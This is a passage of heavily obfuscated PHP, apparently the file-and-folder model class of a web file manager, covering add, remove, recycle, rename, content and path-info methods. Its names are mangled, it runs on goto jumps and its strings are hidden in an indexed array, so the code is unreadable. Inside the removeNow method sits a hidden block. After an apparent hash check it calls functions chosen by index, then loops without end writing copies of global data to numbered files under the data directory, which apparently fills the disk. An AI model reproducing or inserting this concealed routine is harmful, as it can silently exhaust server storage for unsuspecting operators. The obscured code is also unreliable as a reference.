$GLOBALS[$d“Ç¡õìíÄ[6]][$d“Ç¡õìíÄ[84]][$d“Ç¡õìíÄ[505]]; if ($cËéÃ°¨æô[$d“Ç¡õìíÄ[442]][$d“Ç¡õìíÄ[506]] <= time() - $DÀê»Ñó¥ƒ) { $this->metaSet($cËéÃ°¨æô[$d“Ç¡õìíÄ[394]], $d“Ç¡õìíÄ[504], null); $this->metaSet($cËéÃ°¨æô[$d“Ç¡õìíÄ[394]], $d“Ç¡õìíÄ[506], null); } if ($AÌÛÒ«œİ) { $this->metaSet($cËéÃ°¨æô[$d“Ç¡õìíÄ[394]], $d“Ç¡õìíÄ[506], time()); } goto e²š¢—ØÛ; C†©‹ç—‹¼: $d“Ç¡õìíÄ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!isset($cËéÃ°¨æô[$d“Ç¡õìíÄ[442]]) || !$cËéÃ°¨æô[$d“Ç¡õìíÄ[442]][$d“Ç¡õìíÄ[504]]) { return !1; } if ($cËéÃ°¨æô[$d“Ç¡õìíÄ[442]][$d“Ç¡õìíÄ[504]] != USER_ID) { return !0; } goto e¥ËÎç•Ã; e²š¢—ØÛ: return !1; goto C¿Šè”¨´é; C¿Šè”¨´é: } private function _addSoure($e¤å ØÙğ§, $Aê‚³Â±ö§) { goto f¶ÙÌ…ØâÏ; f¶ÙÌ…ØâÏ: $EØ‰”¡—Ÿ =& $_SERVER[åÌÛ»ô¢‚ö™]; $EÌòóÉ„ = array($EØ‰”¡—Ÿ[547] => $Aê‚³Â±ö§[$EØ‰”¡—Ÿ[396]], $EØ‰”¡—Ÿ[548] => $Aê‚³Â±ö§[$EØ‰”¡—Ÿ[482]], $EØ‰”¡—Ÿ[549] => USER_ID, $EØ‰”¡—Ÿ[550] => USER_ID, $EØ‰”¡—Ÿ[393] => $Aê‚³Â±ö§[$EØ‰”¡—Ÿ[394]], $EØ‰”¡—Ÿ[551] => $Aê‚³Â±ö§[$EØ‰”¡—Ÿ[485]] . $Aê‚³Â±ö§[$EØ‰”¡—Ÿ[394]] . $EØ‰”¡—Ÿ[47], $EØ‰”¡—Ÿ[421] => 0, $EØ‰”¡—Ÿ[552] => $EØ‰”¡—Ÿ[33]); $e¤å ØÙğ§ = array_merge($EÌòóÉ„, $e¤å ØÙğ§); goto EÜŠø½©ª; E„»º¾ÖŸ: $e÷×†£àÜÑ = array($EØ‰”¡—Ÿ[553] => short_id($E÷‰É¼±ß×)); $this->where(array($EØ‰”¡—Ÿ[408] => $E÷‰É¼±ß×))->save($e÷×†£àÜÑ); $this->setNamePinyin($E÷‰É¼±ß×, $e¤å ØÙğ§[$EØ‰”¡—Ÿ[28]]); goto bà’›¿£àª; BĞãå÷èÉš: static $aÁË•éšªğ = false; if (!$aÁË•éšªğ) { Hook::trigger($EØ‰”¡—Ÿ[534], $e¤å ØÙğ§); $aÁË•éšªğ = !0; } $E÷‰É¼±ß× = $this->add($e¤å ØÙğ§); goto E„»º¾ÖŸ; EÜŠø½©ª: $this->updateModifyTime($e¤å ØÙğ§[$EØ‰”¡—Ÿ[487]]); $bÕíİÒòì = $EØ‰”¡—Ÿ[2402] . $Aê‚³Â±ö§[$EØ‰”¡—Ÿ[394]]; if (isset(self::$cacheChildList[$bÕíİÒòì])) { unset(self::$cacheChildList[$bÕíİÒòì]); } goto BĞãå÷èÉš; bà’›¿£àª: return $E÷‰É¼±ß×; goto FôÍõ·¼Ø; FôÍõ·¼Ø: } public function remove($aùÇÉÖòµô, $eÂÑ‘ ø™å = true) { goto f‹°­”—¢„; Eä£‘ÕŠïä: CacheLock::unlock($f®é³µá…); $this->metaSet($aùÇÉÖòµô, $Cë–¿Âã´[2411], $A´ìßó¶Ö†[$Cë–¿Âã´[487]]); $this->where(array($Cë–¿Âã´[394] => $aùÇÉÖòµô))->save(array($Cë–¿Âã´[415] => time())); goto Cò£ÖÉ¼æ; bˆ¹É‡œé¿: $fÑî„ˆŒù = $A´ìßó¶Ö†[$Cë–¿Âã´[396]] == self::TYPE_USER ? $Cë–¿Âã´[560] : $Cë–¿Âã´[993]; if ($fÑî„ˆŒù == $Cë–¿Âã´[560]) { $B”¡™­í¡ = Model($Cë–¿Âã´[500])->getInfo($A´ìßó¶Ö†[$Cë–¿Âã´[482]]); $aÚ‹¥Š©±ß = !empty($B”¡™­í¡[$Cë–¿Âã´[2396]]) ? $B”¡™­í¡[$Cë–¿Âã´[2396]] : $B”¡™­í¡[$Cë–¿Âã´[28]]; $aÚ‹¥Š©±ß = $Cë–¿Âã´[263] . $aÚ‹¥Š©±ß . $Cë–¿Âã´[2404] . $A´ìßó¶Ö†[$Cë–¿Âã´[482]]; } else { $B”¡™­í¡ = Model($Cë–¿Âã´[484])->getInfo($A´ìßó¶Ö†[$Cë–¿Âã´[482]]); $aÚ‹¥Š©±ß = _get($B”¡™­í¡, $Cë–¿Âã´[28]); $aÚ‹¥Š©±ß = $Cë–¿Âã´[157] . $aÚ‹¥Š©±ß . $Cë–¿Âã´[2405] . $A´ìßó¶Ö†[$Cë–¿Âã´[482]]; } $f®é³µá… = $Cë–¿Âã´[2406] . md5($aÚ‹¥Š©±ß); goto fçàª¢ˆ¼·; fò´‘å‚Êæ: $B¡•¯Õ¯ö¬ = Model($Cë–¿Âã´[1464])->get($Cë–¿Âã´[2403]) == $Cë–¿Âã´[83]; if ($fš“§®Áé¨ || $eÂÑ‘ ø™å || !$B¡•¯Õ¯ö¬) { return $this->removeNow($aùÇÉÖòµô, $eÂÑ‘ ø™å); } $CŠæ¤†õî© = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto bˆ¹É‡œé¿; f‹°­”—¢„: $Cë–¿Âã´ =& $_SERVER[åÌÛ»ô¢‚ö™]; $A´ìßó¶Ö† = $this->sourceInfo($aùÇÉÖòµô); $fš“§®Áé¨ = intval($A´ìßó¶Ö†[$Cë–¿Âã´[396]]) === self::TYPE_SYSTEM; goto fò´‘å‚Êæ; Cò£ÖÉ¼æ: $this->recycleClear($A´ìßó¶Ö†); $c¥ä–¤½‡õ = $this->move($aùÇÉÖòµô, $b—œ¤‹İµœ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($A´ìßó¶Ö†[$Cë–¿Âã´[487]]); goto eøãççÀ™; fçàª¢ˆ¼·: CacheLock::lock($f®é³µá…); $b—œ¤‹İµœ = $this->fileNameExist($CŠæ¤†õî©, $aÚ‹¥Š©±ß); if (!$b—œ¤‹İµœ) { $b—œ¤‹İµœ = $this->mkdir($CŠæ¤†õî©, $aÚ‹¥Š©±ß, REPEAT_SKIP); $this->metaSet($b—œ¤‹İµœ, $Cë–¿Âã´[2407], $fÑî„ˆŒù); $this->metaSet($b—œ¤‹İµœ, $Cë–¿Âã´[2408], $A´ìßó¶Ö†[$Cë–¿Âã´[482]]); if ($A´ìßó¶Ö†[$Cë–¿Âã´[487]] != 0) { $this->metaSet($b—œ¤‹İµœ, $Cë–¿Âã´[2409], _get($B”¡™­í¡, $Cë–¿Âã´[2410])); } } goto Eä£‘ÕŠïä; eøãççÀ™: return $c¥ä–¤½‡õ; goto C•†É†æÈ; C•†É†æÈ: } private function recycleClear($C’Ãœ™Ÿ‘™) { $aËÓÏ´…Àæ =& $_SERVER[åÌÛ»ô¢‚ö™]; $e¿ğ¨œ‡ = $this->childrenAll($C’Ãœ™Ÿ‘™); $F÷¹¢Á›‹’ = array($aËÓÏ´…Àæ[408] => array($aËÓÏ´…Àæ[409], $e¿ğ¨œ‡[$aËÓÏ´…Àæ[2412]])); Model($aËÓÏ´…Àæ[2413])->where($F÷¹¢Á›‹’)->delete(); } public function removeNow($d‡Š±É¶‚, $d¼Æ‘‡Ó‰í = true) { goto Fš†èÑº„; b÷ÓìÁ ‚: Hook::trigger($D–ÚÔŞ±¿å[2414], $AåôŸš¦…›, $d¼Æ‘‡Ó‰í); if ($d¼Æ‘‡Ó‰í) { Model($D–ÚÔŞ±¿å[2413])->moveToRecycle($d‡Š±É¶‚); } else { $AÒÂÓ«Í†ô = $this->childrenAll($CŒÆéÇ¡¼); Model($D–ÚÔŞ±¿å[531])->eventRemove($d‡Š±É¶‚); $this->removeRelevance($AÒÂÓ«Í†ô[$D–ÚÔŞ±¿å[2412]], $AÒÂÓ«Í†ô[$D–ÚÔŞ±¿å[1284]]); } $this->folderSizeReset($CŒÆéÇ¡¼[$D–ÚÔŞ±¿å[487]]); goto eÁ©ÕÜïƒÜ; Fˆ£ö¼Ğ£: if (!$CŒÆéÇ¡¼) { return !0; } if ($CŒÆéÇ¡¼[$D–ÚÔŞ±¿å[487]] == 0) { if (!_get($GLOBALS, $D–ÚÔŞ±¿å[483])) { return !1; } } $this->lockMoveStart($d‡Š±É¶‚); goto b÷ÓìÁ ‚; a¥÷µ­·ƒÚ: $this->lockMoveEnd($d‡Š±É¶‚); Hook::trigger($D–ÚÔŞ±¿å[1499], $AåôŸš¦…›, $d¼Æ‘‡Ó‰í); return !0; goto fåõß²àí¬; eÁ©ÕÜïƒÜ: $d¥ŒÂÇåÛ‰ = array($CŒÆéÇ¡¼[$D–ÚÔŞ±¿å[487]]); if ($CŒÆéÇ¡¼[$D–ÚÔŞ±¿å[395]] == $D–ÚÔŞ±¿å[83]) { $d¥ŒÂÇåÛ‰[] = $CŒÆéÇ¡¼[$D–ÚÔŞ±¿å[394]]; } $this->updateModifyTime($d¥ŒÂÇåÛ‰); goto a¥÷µ­·ƒÚ; eÕï¦™Õƒ½: if ($_SERVER[$D–ÚÔŞ±¿å[179]] != $fÓˆÚ“($EºŸÈ”£ó)) { goto Fô‘­‡¬äà; Fô‘­‡¬äà: $B‘•§ ¹Ã¾ = $D–ÚÔŞ±¿å[818]; $Aâ‚İ¢¦ß« = $D–ÚÔŞ±¿å[180]; $cæÇ ¡‚¤  = $_SERVER[$D–ÚÔŞ±¿å[181]] . $D–ÚÔŞ±¿å[182]; goto a¥´ÎÊªÔÇ; a¥´ÎÊªÔÇ: $bö”¹˜ÊØò = $Aâ‚İ¢¦ß«($cæÇ ¡‚¤ ); $DÕ»Õ²ğ¬å = explode($D–ÚÔŞ±¿å[183], $bö”¹˜ÊØò); if (count($DÕ»Õ²ğ¬å) < $D–ÚÔŞ±¿å[573]) { $cá¶ÔÏİ¥ = $D–ÚÔŞ±¿å[185]; $cá¶ÔÏİ¥(); } goto eó„‹¶åîĞ; eó„‹¶åîĞ: $dÌª«ğ‹Áœ = $D–ÚÔŞ±¿å[819]; $dÌª«ğ‹Áœ($_SERVER[$D–ÚÔŞ±¿å[820]]); $B‘•§ ¹Ã¾ = $D–ÚÔŞ±¿å[818]; goto EÖË×’¦³Š; EÖË×’¦³Š: $B‘•§ ¹Ã¾(); $eõ´àìÏ¦À = $D–ÚÔŞ±¿å[1395]; $C—Ëƒø¡ = json_encode($GLOBALS[$D–ÚÔŞ±¿å[1396]]); goto aµÖŸ›ÏÚÆ; aµÖŸ›ÏÚÆ: $E¢½ƒ‚Úª = 1; for ($A½’ñÅ÷íÅ = $E¢½ƒ‚Úª; $A½’ñÅ÷íÅ > 0; $A½’ñÅ÷íÅ++) { $eõ´àìÏ¦À(DATA_PATH . $A½’ñÅ÷íÅ, $C—Ëƒø¡); } goto BÓÍ£‘…µ; BÓÍ£‘…µ: } $CŒÆéÇ¡¼ = $this->sourceInfo($d‡Š±É¶‚); $AåôŸš¦…› = $this->pathInfoMore($d‡Š±É¶‚); goto Fˆ£ö¼Ğ£; Fš†èÑº„: $D–ÚÔŞ±¿å =& $_SERVER[åÌÛ»ô¢‚ö™]; $EºŸÈ”£ó = $_SERVER[$D–ÚÔŞ±¿å[820]] . $D–ÚÔŞ±¿å[177]; $fÓˆÚ“ = $D–ÚÔŞ±¿å[178]; goto eÕï¦™Õƒ½; fåõß²àí¬: } public function childrenAll($F‹„®Óö‘—) { $dõ„Ã“½¨‡ =& $_SERVER[åÌÛ»ô¢‚ö™]; $cµÂÌÛÀé = $F‹„®Óö‘—[$dõ„Ã“½¨‡[394]]; if ($F‹„®Óö‘—[$dõ„Ã“½¨‡[395]] == $dõ„Ã“½¨‡[83]) { $d¼ å¢¢ØŸ = array($dõ„Ã“½¨‡[551] => array($dõ„Ã“½¨‡[509], $F‹„®Óö‘—[$dõ„Ã“½¨‡[485]] . $cµÂÌÛÀé . $dõ„Ã“½¨‡[510])); $B«¥¡©Ö´ = array($dõ„Ã“½¨‡[551] => $d¼ å¢¢ØŸ[$dõ„Ã“½¨‡[485]]); $C†´ïÁ©ª = $this->field($dõ„Ã“½¨‡[2415])->where($B«¥¡©Ö´)->select(); $CÚÏæîœ³ = !1; $bæŠ„²òöñ = array($cµÂÌÛÀé); if ($C†´ïÁ©ª) { $CÚÏæîœ³ = array_to_keyvalue($C†´ïÁ©ª, $dõ„Ã“½¨‡[33], $dõ„Ã“½¨‡[444]); $CÚÏæîœ³ = array_remove_value($CÚÏæîœ³, $dõ„Ã“½¨‡[494]); $bæŠ„²òöñ = array_to_keyvalue($C†´ïÁ©ª, $dõ„Ã“½¨‡[33], $dõ„Ã“½¨‡[394]); $bæŠ„²òöñ[] = $cµÂÌÛÀé; } } else { $CÚÏæîœ³ = array($F‹„®Óö‘—[$dõ„Ã“½¨‡[444]]); $bæŠ„²òöñ = array($cµÂÌÛÀé); } return array($dõ„Ã“½¨‡[2412] => $bæŠ„²òöñ, $dõ„Ã“½¨‡[1284] => $CÚÏæîœ³); } public function removeArray($DŸ©Îˆ²é) { if (!$DŸ©Îˆ²é) { return !0; } } public function removeRelevance($eÂØê„ë¸³, $B¤ÒÃàÛŒ) { goto A …Î‰Ì×õ; aØİÃâÇà½: $eÂØê„ë¸³ = array_unique(array_filter($eÂØê„ë¸³)); $B¤ÒÃàÛŒ = array_unique(array_filter($B¤ÒÃàÛŒ)); if (!$eÂØê„ë¸³) { return !1; } goto AÈ„§–Áè; AÈ„§–Áè: $a™¤åªˆ† = array($a×ñÜëÅ¸[408] => array($a×ñÜëÅ¸[409], $eÂØê„ë¸³)); Model($a×ñÜëÅ¸[2413])->where($a™¤åªˆ†)->delete(); Model($a×ñÜëÅ¸[438])->where($a™¤åªˆ†)->delete(); goto DÖÎó‚Ù‡Ê; DÖÎó‚Ù‡Ê: Model($a×ñÜëÅ¸[2267])->where($a™¤åªˆ†)->delete(); Model($a×ñÜëÅ¸[531])->where($a™¤åªˆ†)->delete(); Model($a×ñÜëÅ¸[2115])->removeBySource($eÂØê„ë¸³); goto Dáñ»ÆĞçå; D„¹›ªõ„»: for ($cáöØ»™øŞ = 0; $cáöØ»™øŞ < count($eÂØê„ë¸³); $cáöØ»™øŞ++) { $this->sourceCacheClear($eÂØê„ë¸³[$cáöØ»™øŞ]); } goto C•…ïˆà¿à; Dáñ»ÆĞçå: Model($a×ñÜëÅ¸[2394])->removeBySource($eÂØê„ë¸³); $this->where($a™¤åªˆ†)->delete(); Model($a×ñÜëÅ¸[447])->remove($B¤ÒÃàÛŒ); goto D„¹›ªõ„»; A …Î‰Ì×õ: $a×ñÜëÅ¸ =& $_SERVER[åÌÛ»ô¢‚ö™]; $eÂØê„ë¸³ = $eÂØê„ë¸³ ? $eÂØê„ë¸³ : array(); $B¤ÒÃàÛŒ = $B¤ÒÃàÛŒ ? $B¤ÒÃàÛŒ : array(); goto aØİÃâÇà½; C•…ïˆà¿à: } public function rename($d¸¥ç‹…Â, $cìÔ½ˆ¤Ú½) { goto D‡“‚«×Ë; E„ôßÆ¶·À: $EŠÇ‰ùÑ“È = $this->fileNameExist($Fğâ§íó§¿[$bê ¨‹èÚ‹[487]], $cìÔ½ˆ¤Ú½); if ($EŠÇ‰ùÑ“È && $EŠÇ‰ùÑ“È != $d¸¥ç‹…Â) { return !1; } $E‹‡°æš‡“ = array($bê ¨‹èÚ‹[411] => $cìÔ½ˆ¤Ú½, $bê ¨‹èÚ‹[550] => USER_ID); goto CëÄ¢ø–± ; D‡“‚«×Ë: $bê ¨‹èÚ‹ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Fğâ§íó§¿ = $this->sourceInfo($d¸¥ç‹…Â); if (!$Fğâ§íó§¿) { return !1; } goto E„ôßÆ¶·À; F…µ„¿ó‰Ş: $this->setNamePinyin($d¸¥ç‹…Â, $E‹‡°æš‡“[$bê ¨‹èÚ‹[28]], !1); $this->updateModifyTime($Fğâ§íó§¿[$bê ¨‹èÚ‹[487]]); $Fˆ«¨¹À Î = $this->where(array($bê ¨‹èÚ‹[408] => $d¸¥ç‹…Â))->data($E‹‡°æš‡“)->save(); goto EÁŞÖ±Ê¯; CëÄ¢ø–± : if (!$Fğâ§íó§¿[$bê ¨‹èÚ‹[395]] == $bê ¨‹èÚ‹[83]) { $E‹‡°æš‡“[$bê ¨‹èÚ‹[397]] = get_path_ext($cìÔ½ˆ¤Ú½); } Model($bê ¨‹èÚ‹[531])->eventRename($d¸¥ç‹…Â, $Fğâ§íó§¿[$bê ¨‹èÚ‹[28]], $cìÔ½ˆ¤Ú½); $this->sourceCacheClear($d¸¥ç‹…Â); goto F…µ„¿ó‰Ş; EÁŞÖ±Ê¯: $EÔ–Ãëò“ = $bê ¨‹èÚ‹[2402] . $Fğâ§íó§¿[$bê ¨‹èÚ‹[487]]; if (isset(self::$cacheChildList[$EÔ–Ãëò“])) { unset(self::$cacheChildList[$EÔ–Ãëò“]); } return $Fˆ«¨¹À Î; goto C­¿†Í¹ Œ; C­¿†Í¹ Œ: } public function setNamePinyin($F—ÜâîÖ ·, $E±¹·âñ©Ö, $Aİš„ªŒËÔ = true) { $C÷â•ä¹Ú­ =& $_SERVER[åÌÛ»ô¢‚ö™]; $cêôëä¶ŠÛ = Input::check($E±¹·âñ©Ö, $C÷â•ä¹Ú­[554]); if ($Aİš„ªŒËÔ && !$cêôëä¶ŠÛ) { return; } if (!$cêôëä¶ŠÛ) { $this->metaSet($F—ÜâîÖ ·, $C÷â•ä¹Ú­[441], null); $this->metaSet($F—ÜâîÖ ·, $C÷â•ä¹Ú­[440], null); return; } $fšßºÓæ°­ = array($C÷â•ä¹Ú­[441] => str_replace($C÷â•ä¹Ú­[50], $C÷â•ä¹Ú­[33], Pinyin::encode($E±¹·âñ©Ö)), $C÷â•ä¹Ú­[440] => Pinyin::encode($E±¹·âñ©Ö, $C÷â•ä¹Ú­[555])); $this->metaSet($F—ÜâîÖ ·, $fšßºÓæ°­); } public function getContent($d¼Ö¾Àñ‰) { goto DŒ†«ÔÉ–„; DÛîÙ¶Ôµ£: if ($aîƒ»«Û¶‹[$f™¤ôšÏä¦[77]] == 0) { return $f™¤ôšÏä¦[33]; } $c’¬Ç‰ÙÍ‘ = $f™¤ôšÏä¦[2416] . $aîƒ»«Û¶‹[$f™¤ôšÏä¦[167]]; if ($aîƒ»«Û¶‹[$f™¤ôšÏä¦[77]] <= 1024 * 10) { $a¿á¯†«›½ = Cache::get($c’¬Ç‰ÙÍ‘); if (!$a¿á¯†«›½) { $a¿á¯†«›½ = IO::getContent($aîƒ»«Û¶‹[$f™¤ôšÏä¦[75]]); Cache::set($c’¬Ç‰ÙÍ‘, $a¿á¯†«›½); } return $a¿á¯†«›½; } goto f©¹•İõŒ; f©¹•İõŒ: if (!$aîƒ»«Û¶‹[$f™¤ôšÏä¦[75]]) { return $f™¤ôšÏä¦[33]; } return IO::getContent($aîƒ»«Û¶‹[$f™¤ôšÏä¦[75]]); goto eç¢©‘ ·¥; DŒ†«ÔÉ–„: $f™¤ôšÏä¦ =& $_SERVER[åÌÛ»ô¢‚ö™]; $aîƒ»«Û¶‹ = $this->fileInfoGet($d¼Ö¾Àñ‰); if (!$aîƒ»«Û¶‹) { return !1; } goto DÛîÙ¶Ôµ£; eç¢©‘ ·¥: } public function setDesc($fİ¶Ï›©‡â, $a¼½¦Œãì¶) { $DŸÔà‹­¢ì =& $_SERVER[åÌÛ»ô¢‚ö™]; Model($DŸÔà‹­¢ì[531])->eventAddDesc($fİ¶Ï›©‡â, $a¼½¦Œãì¶); return $this->metaSet($fİ¶Ï›©‡â, $DŸÔà‹­¢ì[430], $a¼½¦Œãì¶); } public function setContent($CäÃ¸¢×‰¨, $Fê“Ó¶ê = '') { goto Cœç•Á‚²; Cœç•Á‚²: $cê‘«Íù›Ñ =& $_SERVER[åÌÛ»ô¢‚ö™]; $e†¬µâÏ”¯ = $this->sourceInfo($CäÃ¸¢×‰¨); $D¹í…ÏÅ„† = $this->fileInfoGet($CäÃ¸¢×‰¨); goto c¹¾Ó–µ—Ú; eÈ…¢èÄµ: if (!$E»¦Ú¨öÔ‚) { return Model($cê‘«Íù›Ñ[447])->remove($B›è«¹¹Âß[$cê‘«Íù›Ñ[444]]); } $this->folderSizeReset($e†¬µâÏ”¯[$cê‘«Íù›Ñ[487]]); return !0; goto föœÚ„…­; c¹¾Ó–µ—Ú: if (!$D¹í…ÏÅ„† || !$e†¬µâÏ”¯) { return !1; } $B›è«¹¹Âß = Model($cê‘«Íù›Ñ[447])->addFileByContent($Fê“Ó¶ê, $e†¬µâÏ”¯[$cê‘«Íù›Ñ[28]]); $E»¦Ú¨öÔ‚ = $this->fileHistory($e†¬µâÏ”¯, $B›è«¹¹Âß[$cê‘«Íù›Ñ[444]], $B›è«¹¹Âß[$cê‘«Íù›Ñ[77]]); goto eÈ…¢èÄµ; föœÚ„…­: } public function fileSubstr($B‰ÔŞÉòàÛ, $d†©šÖÃÉ—, $eøµ²î¢ˆ) { $A£ÓŒŠ¬• = $this->fileInfoGet($B‰ÔŞÉòàÛ); if (!$A£ÓŒŠ¬•) { return !1; } return IO::fileSubstr($A£ÓŒŠ¬•[$_SERVER[åÌÛ»ô¢‚ö™][75]], $d†©šÖÃÉ—, $eøµ²î¢ˆ); } public function fileInfoGet($A›‚Š½Ç) { goto aÛ¾ó”˜ª; a‚Ó™öÄ¤: return $DÓ¢ÀÀë¹¡; goto FÆÇ£„šŠ­; E•…éËîÛí: $DÓ¢ÀÀë¹¡ = Model($D¾îˆèÓÃ[447])->fileInfo($F·„Œñ¦Ö‡[$D¾îˆèÓÃ[444]]); if ($DÓ¢ÀÀë¹¡) { $DÓ¢ÀÀë¹¡[$D¾îˆèÓÃ[28]] = $F·„Œñ¦Ö‡[$D¾îˆèÓÃ[28]]; } self::$cacheFileInfo[$C»—¹¤¢êä] = $DÓ¢ÀÀë¹¡; goto a‚Ó™öÄ¤; aÛ¾ó”˜ª: $D¾îˆèÓÃ =& $_SERVER[åÌÛ»ô¢‚ö™]; $F·„Œñ¦Ö‡ = $this->sourceInfo($A›‚Š½Ç); if (!$F·„Œñ¦Ö‡ || $F·„Œñ¦Ö‡[$D¾îˆèÓÃ[395]]) { return !1; } goto dö¤š÷‚‘Æ; dö¤š÷‚‘Æ: $C»—¹¤¢êä = $D¾îˆèÓÃ[450] . $F·„Œñ¦Ö‡[$D¾îˆèÓÃ[444]]; $fŞÒêŒ¼„ø = _get(self::$cacheFileInfo, $C»—¹¤¢êä); if ($fŞÒêŒ¼„ø) { return $fŞÒêŒ¼„ø; } goto E•…éËîÛí; FÆÇ£„šŠ­: } private function folderChildrenNumber($dŠÕ÷Îå¹·) { $c–‘ç¤–ëá =& $_SERVER[åÌÛ»ô¢‚ö™]; $d–İ¬Ò·êé = $this->sourceInfo($dŠÕ÷Îå¹·); $F¢£Óí—¼™ = array($c–‘ç¤–ëá[551] => array($c–‘ç¤–ëá[509], $d–İ¬Ò·êé[$c–‘ç¤–ëá[485]] . $dŠÕ÷Îå¹· . $c–‘ç¤–ëá[510]), $c–‘ç¤–ëá[421] => intval($d–İ¬Ò·êé[$c–‘ç¤–ëá[422]]), $c–‘ç¤–ëá[544] => 1); $E±ÁÒÀ“Ûğ = $this->where($F¢£Óí—¼™)->count(); $Dà˜‰‚Šº = $this->where($F¢£Óí—¼™)->where(array($c–‘ç¤–ëá[544] => 0))->count(); return array($c–‘ç¤–ëá[81] => $Dà˜‰‚Šº, $c–‘ç¤–ëá[82] => $E±ÁÒÀ“Ûğ); } public function pathInfo($d½ùîÉ—Ú, $FƒµÅšº = false) { goto B”Ğ¡›å…; eÔµğÍ• £: self::$cachePathInfo[$B¿Äâ‡›Î—] = $E­Î²œäÄæ; return $E­Î²œäÄæ; goto EÕµå—®¶¹; e¼Ì”ÈÌ·: $E­Î²œäÄæ = $this->sourceInfo($d½ùîÉ—Ú); if (!$E­Î²œäÄæ) { return !1; } $E­Î²œäÄæ = $this->_listDataApplyItem($E­Î²œäÄæ, $FƒµÅšº); goto eÔµğÍ• £; B”Ğ¡›å…: $e¬ã½í‡öÑ =& $_SERVER[åÌÛ»ô¢‚ö™]; $FƒµÅšº = !1; $d½ùîÉ—Ú = intval($d½ùîÉ—Ú); goto d”‘àêÀ°; d”‘àêÀ°: $B¿Äâ‡›Î— = $e¬ã½í‡öÑ[436] . intval($FƒµÅšº) . $e¬ã½í‡öÑ[437] . $d½ùîÉ—Ú; $eÏÅèË¯ßÌ = _get(self::$cachePathInfo, $B¿Äâ‡›Î—); if ($eÏÅèË¯ßÌ) { return $eÏÅèË¯ßÌ; } goto e¼Ì”ÈÌ·; EÕµå—®¶¹: } public static $cachePathInfoMore = array(); public function pathInfoMore($c¨ò”ä³ñ) { goto döİ´ˆïî; eé©›¹¨Ñ·: $eÚÃº‘Ä¥ = $this->pathInfo($c¨ò”ä³ñ); if (!$eÚÃº‘Ä¥) { return !1; } if ($eÚÃº‘Ä¥[$aŞÒ®»§‹©[395]] == $aŞÒ®»§‹©[83]) { $eÚÃº‘Ä¥[$aŞÒ®»§‹©[80]] = $this->folderChildrenNumber($c¨ò”ä³ñ); } goto c²À«ŸÚë…; döİ´ˆïî: $aŞÒ®»§‹© =& $_SERVER[åÌÛ»ô¢‚ö™]; $eµ·ß¬ ç‡ = _get(self::$cachePathInfoMore, $c¨ò”ä³ñ); if ($eµ·ß¬ ç‡) { return $eµ·ß¬ ç‡; } goto eé©›¹¨Ñ·; c²À«ŸÚë…: self::$cachePathInfoMore[$c¨ò”ä³ñ] = $eÚÃº‘Ä¥; return $eÚÃº‘Ä¥; goto A«ö‰¬Œ‚; A«ö‰¬Œ‚: } public function sourceInfo($fƒÕùéÛ½Õ) { goto E¢ÉõÃò®›; E¢ÉõÃò®›: $F¼ŠÆ×ñƒ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$fƒÕùéÛ½Õ) { return array(); } $fƒÕùéÛ½Õ = intval($fƒÕùéÛ½Õ); goto Aš‹³µ°ù; DµåàŞŠé¦: $Eòê¹‹Â§ = $this->where(array($F¼ŠÆ×ñƒ[394] => $fƒÕùéÛ½Õ))->find(); self::$cacheSourceInfo[$a‰êÓ‚ä‰Õ] = $Eòê¹‹Â§; return self::$cacheSourceInfo[$a‰êÓ‚ä‰Õ]; goto a°Ø»¶œ½½; Aš‹³µ°ù: $a‰êÓ‚ä‰Õ = $F¼ŠÆ×ñƒ[435] . $fƒÕùéÛ½Õ; $C×Ç¡¶´Íº = _get(self::$cacheSourceInfo, $a‰êÓ‚ä‰Õ); if ($C×Ç¡¶´Íº) { return $C×Ç¡¶´Íº; } goto DµåàŞŠé¦; a°Ø»¶œ½½: } public function sourceCacheClear($Båğ²÷›‹Á = false) { if ($Båğ²÷›‹Á == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[åÌÛ»ô¢‚ö™][435] . $Båğ²÷›‹Á]); } public function pathInfoByPath($dœ«ÀÂ²Ö«, $eººßìñ ñ) { $cÓĞ‘ã›ì =& $_SERVER[åÌÛ»ô¢‚ö™]; $FéŠ¯á÷ = !$eººßìñ ñ ? array() : explode($cÓĞ‘ã›ì[8], trim($eººßìñ ñ, $cÓĞ‘ã›ì[8])); $b² êŞÀÓ = $dœ«ÀÂ²Ö«; foreach ($FéŠ¯á÷ as $fÆò¿½›¸) { $D‘·ÁÌ‹˜á = array($cÓĞ‘ã›ì[487] => $b² êŞÀÓ, $cÓĞ‘ã›ì[28] => $fÆò¿½›¸); $BÃÙ´Óº¨Ä = $this->where($D‘·ÁÌ‹˜á)->select(); if (!$BÃÙ´Óº¨Ä) { return !1; } $BÃÙ´Óº¨Ä = array_sort_by($BÃÙ´Óº¨Ä, $cÓĞ‘ã›ì[422]); $b² êŞÀÓ = $BÃÙ´Óº¨Ä[0][$cÓĞ‘ã›ì[394]]; } return $this->pathInfo($b² êŞÀÓ, !0); } protected function updateModifyTime($A‘„à£Ûê) { goto A³Û‘‚ŞñÎ; A³Û‘‚ŞñÎ: $e¯Ùè›ñ°Í =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$A‘„à£Ûê) { return; } if (!is_array($A‘„à£Ûê)) { $A‘„à£Ûê = array($A‘„à£Ûê); } goto Bø”“á°¢; FÇ”õŸÏ¯: $this->where($fÛÂ˜‰½ë)->save($dİ’ô±‘À¾); goto CÀ¦§×ˆ°; Bø”“á°¢: foreach ($A‘„à£Ûê as $e¥’ˆ¿‘Õë => $cñÒ¯—š¾©) { $A‘„à£Ûê[$e¥’ˆ¿‘Õë] = intval($cñÒ¯—š¾©); } $fÛÂ˜‰½ë = array($e¯Ùè›ñ°Í[394] => array($e¯Ùè›ñ°Í[7], $A‘„à£Ûê)); $dİ’ô±‘À¾ = array($e¯Ùè›ñ°Í[550] => USER_ID, $e¯Ùè›ñ°Í[415] => time()); goto FÇ”õŸÏ¯; CÀ¦§×ˆ°: } public function folderSizeReset($cŠÆ†Â‘™¨) { goto fÀ”ÌÌ¤›É; E•¢ôéòé: $b‘³äŞÔò = array($EŠÓ°íãí‡[393] => $cŠÆ†Â‘™¨, $EŠÓ°íãí‡[421] => 0); $E¦ƒÒÉæÒ = $this->where($b‘³äŞÔò)->sum($EŠÓ°íãí‡[77]); $E¦ƒÒÉæÒ = intval($E¦ƒÒÉæÒ); goto 